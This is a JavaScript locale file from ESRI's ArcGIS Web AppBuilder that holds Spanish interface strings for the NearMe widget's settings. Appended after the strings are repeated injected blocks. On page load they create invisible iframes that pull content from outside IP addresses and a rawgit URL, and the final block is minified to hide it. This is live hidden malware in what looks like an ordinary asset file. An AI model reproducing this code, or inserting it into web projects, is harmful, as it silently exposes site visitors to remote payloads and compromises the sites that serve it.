// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Millas",acronym:"mi"},kilometers:{displayText:"Kil\u00f3metros",acronym:"km"},feet:{displayText:"Pies",acronym:"pie"},meters:{displayText:"Metros",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"Configuraci\u00f3n de fuente de b\u00fasqueda",searchSourceSettingTitle:"Configuraci\u00f3n de fuente de b\u00fasqueda",searchSourceSettingTitleHintText:"Agrega y configura servicios de geocodificaci\u00f3n o capas de entidades como fuentes de b\u00fasqueda. Estas fuentes especificadas determinan qu\u00e9 se puede buscar en el cuadro de b\u00fasqueda",
addSearchSourceLabel:"Agregar origen de b\u00fasqueda",featureLayerLabel:"Capa de entidades",geocoderLabel:"Geocodificador",nameTitle:"Nombre",generalSettingLabel:"Configuraci\u00f3n general",allPlaceholderLabel:"Texto del marcador de posici\u00f3n para buscar en todo:",allPlaceholderHintText:"Sugerencia: escriba el texto que se va a mostrar como marcador de posici\u00f3n mientras busca todas las capas y el geocodificador",generalSettingCheckboxLabel:"Mostrar ventana emergente de la entidad o la ubicaci\u00f3n encontrada",
countryCode:"C\u00f3digo(s) de pa\u00eds o regi\u00f3n",countryCodeEg:"p. ej., ",countryCodeHint:"Si se deja este valor en blanco, se buscar\u00e1 en todos los pa\u00edses y regiones",questionMark:"?",searchInCurrentMapExtent:"Buscar solo en la extensi\u00f3n de mapa actual",zoomScale:"Aplicar zoom a escala",locatorUrl:"Direcci\u00f3n URL del geocodificador",locatorName:"Nombre del geocodificador",locatorExample:"Ejemplo",locatorWarning:"No se admite esta versi\u00f3n del servicio de geocodificaci\u00f3n. El widget admite servicios de geocodificaci\u00f3n 10.0 y superiores.",
locatorTips:"No hay sugerencias disponibles porque el servicio de geocodificaci\u00f3n no admite la opci\u00f3n de sugerencias.",layerSource:"Origen de capa",setLayerSource:"Establecer origen de capa",setGeocoderURL:"Establecer direcci\u00f3n URL de geocodificador",searchLayerTips:"No hay sugerencias disponibles porque el servicio de entidades no admite la opci\u00f3n de paginaci\u00f3n.",placeholder:"Texto del marcador de posici\u00f3n",searchFields:"Campos de b\u00fasqueda",displayField:"Mostrar campo",
exactMatch:"Coincidencia exacta",maxSuggestions:"M\u00e1ximo de sugerencias",maxResults:"Resultados m\u00e1ximos",enableLocalSearch:"Habilitar b\u00fasqueda local",minScale:"Escala M\u00ednima",minScaleHint:"Si la escala del mapa es mayor que esta escala, se aplicar\u00e1 la b\u00fasqueda local",radius:"Radio",radiusHint:"Permite especificar el radio de un \u00e1rea alrededor del centro del mapa actual que se utilizar\u00e1 para mejorar la clasificaci\u00f3n de los candidatos de geocodificaci\u00f3n a fin de que se devuelvan primero aquellos m\u00e1s cercanos a la ubicaci\u00f3n",
meters:"Metros",setSearchFields:"Establecer campos de b\u00fasqueda",set:"Definir",fieldName:"Nombre",invalidUrlTip:"No se puede acceder a la direcci\u00f3n URL ${URL} o bien no es v\u00e1lida."},searchSetting:{searchSettingTabTitle:"Configuraci\u00f3n de b\u00fasqueda",defaultBufferDistanceLabel:"Definir distancia de zona de influencia predeterminada",maxResultCountLabel:"N\u00famero l\u00edmite de resultados",maxResultCountHintLabel:"Sugerencia: establezca el n\u00famero m\u00e1ximo de resultados visibles. el valor de 1 devolver\u00e1 la entidad m\u00e1s cercana.",
maxBufferDistanceLabel:"Definir distancia de zona de influencia m\u00e1xima",bufferDistanceUnitLabel:"Unidades de distancia del \u00e1rea de influencia",defaultBufferHintLabel:"Sugerencia: defina el valor predeterminado para el control deslizante de zona de influencia",maxBufferHintLabel:"Sugerencia: defina el valor m\u00e1ximo para el control deslizante de zona de influencia",bufferUnitLabel:"Sugerencia: define una unidad para crear la zona de influencia",selectGraphicLocationSymbol:"S\u00edmbolo de direcci\u00f3n o ubicaci\u00f3n",
graphicLocationSymbolHintText:"Sugerencia: s\u00edmbolo para la direcci\u00f3n buscada o para la ubicaci\u00f3n en la que se ha hecho clic",addressLocationPolygonHintText:"Sugerencia: s\u00edmbolo de la capa de pol\u00edgonos de b\u00fasqueda",popupTitleForPolygon:"Seleccionar pol\u00edgono para la ubicaci\u00f3n de direcci\u00f3n seleccionada",popupTitleForPolyline:"Seleccionar l\u00ednea para la ubicaci\u00f3n de direcci\u00f3n",addressLocationPolylineHintText:"Sugerencia: s\u00edmbolo de la capa de polil\u00edneas de b\u00fasqueda",
fontColorLabel:"Seleccionar color de fuente para resultados de b\u00fasqueda",fontColorHintText:"Sugerencia: color de fuente de los resultados de la b\u00fasqueda",zoomToSelectedFeature:"Aplicar zoom a la entidad seleccionada",zoomToSelectedFeatureHintText:"Sugerencia: aplique el zoom a la entidad seleccionada en lugar de la zona de influencia",intersectSearchLocation:"Devolver pol\u00edgonos que se intersecan",intersectSearchLocationHintText:"Sugerencia: devuelva los pol\u00edgonos que contienen la ubicaci\u00f3n buscada en lugar de los pol\u00edgonos contenidos en la zona de influencia",
enableProximitySearch:"Habilitar b\u00fasqueda por proximidad",enableProximitySearchHintText:"Sugerencia: Habilite la funci\u00f3n para buscar ubicaciones cercanas a un resultado seleccionado",bufferVisibilityLabel:"Definir visibilidad de zona de influencia",bufferVisibilityHintText:"Sugerencia: la zona de influencia se mostrar\u00e1 en el mapa",bufferColorLabel:"Definir s\u00edmbolo de zona de influencia",bufferColorHintText:"Sugerencia: seleccione el color y la transparencia de la zona de influencia",
searchLayerResultLabel:"Dibujar solo resultados de la capa seleccionada",searchLayerResultHint:"Sugerencia: solo la capa seleccionada en los resultados de b\u00fasqueda se dibujar\u00e1 en el mapa",showToolToSelectLabel:"Seleccionar bot\u00f3n de ubicaci\u00f3n",showToolToSelectHintText:"Sugerencia: proporciona un bot\u00f3n para establecer una ubicaci\u00f3n en el mapa en vez de establecer siempre la ubicaci\u00f3n cuando se ha hecho clic en el mapa",geoDesicParamLabel:"Utilizar zona de influencia geod\u00e9sica",
geoDesicParamHintText:"Sugerencia: utilice una zona de influencia geod\u00e9sica en vez de una zona de influencia euclidiana (planar)"},layerSelector:{selectLayerLabel:"Seleccionar capas de b\u00fasqueda",layerSelectionHint:"Sugerencia: usa el bot\u00f3n de definir para seleccionar capas",addLayerButton:"Definir"},routeSetting:{routeSettingTabTitle:"Configuraciones de indicaciones",routeServiceUrl:"Servicio de generaci\u00f3n de rutas",buttonSet:"Definir",routeServiceUrlHintText:'Sugerencia: haga clic en "Definir" para examinar y seleccionar un servicio de generaci\u00f3n de rutas',
directionLengthUnit:"Unidades de longitud de direcci\u00f3n",unitsForRouteHintText:"Sugerencia: se utiliza para visualizar las unidades para la ruta",selectRouteSymbol:"Seleccionar s\u00edmbolo para visualizar ruta",routeSymbolHintText:"Sugerencia: se utiliza para visualizar el s\u00edmbolo de l\u00ednea de la ruta",routingDisabledMsg:"Para habilitar las indicaciones, aseg\u00farese de que la generaci\u00f3n de rutas est\u00e1 habilitada en el elemento, en la configuraci\u00f3n de la aplicaci\u00f3n."},
symbologySetting:{symbologySettingTabTitle:"Configuraci\u00f3n de simbolog\u00eda",addSymbologyBtnLabel:"Agregar nuevos s\u00edmbolos",layerNameTitle:"Nombre de capa",fieldTitle:"Campo",valuesTitle:"Valores",symbolTitle:"S\u00edmbolo",actionsTitle:"Acciones",invalidConfigMsg:"Campo duplicado: ${fieldName} para la capa: ${layerName}"},filterSetting:{filterSettingTabTitle:"Configuraci\u00f3n de filtro",addTaskTip:"Agregue uno o varios filtros a las capas de b\u00fasqueda seleccionadas y configure par\u00e1metros para cada una de ellas.",
enableMapFilter:"Elimine el filtro predefinido de la capa desde el mapa.",newFilter:"Nuevo filtro",filterExpression:"Expresi\u00f3n de filtro",layerDefaultSymbolTip:"Usar s\u00edmbolo predeterminado de capa",uploadImage:"Cargar una imagen",selectLayerTip:"Seleccione una capa.",setTitleTip:"Defina un t\u00edtulo.",noTasksTip:'No hay filtros configurados. Haga clic en "${newFilter}" para agregar uno nuevo.',collapseFiltersTip:"Contraer las expresiones de filtro (si las hay) al abrir el widget"},networkServiceChooser:{arcgislabel:"Agregar desde ArcGIS Online",
serviceURLabel:"Agregar URL de servicio",routeURL:"URL de ruta",validateRouteURL:"Validar",exampleText:"Ejemplo",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Especifica un servicio de rutas v\u00e1lido.",rateLimitExceeded:"Se ha superado el l\u00edmite de velocidad. Vuelva a intentarlo m\u00e1s tarde.",errorInvokingService:"El nombre de usuario o la contrase\u00f1a son incorrectos."},
errorStrings:{bufferErrorString:"Introduce un valor num\u00e9rico v\u00e1lido.",selectLayerErrorString:"Selecciona las capas para buscar.",invalidDefaultValue:"La distancia de zona de influencia predeterminada no puede estar en blanco. Especifica la distancia de zona de influencia.",invalidMaximumValue:"La distancia de zona de influencia m\u00e1xima no puede estar en blanco. Especifica la distancia de zona de influencia.",defaultValueLessThanMax:"Especifica la distancia de zona de influencia predeterminada dentro del l\u00edmite m\u00e1ximo",
defaultBufferValueGreaterThanOne:"La distancia de zona de influencia predeterminada no puede ser menor que 0",maximumBufferValueGreaterThanOne:"Especifica una distancia de zona de influencia m\u00e1xima mayor que 0",invalidMaximumResultCountValue:"Especifique un valor v\u00e1lido para el recuento de resultados m\u00e1ximo",invalidSearchSources:"Configuraci\u00f3n de fuente de b\u00fasqueda no v\u00e1lida"},symbolPickerPreviewText:"Vista previa:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});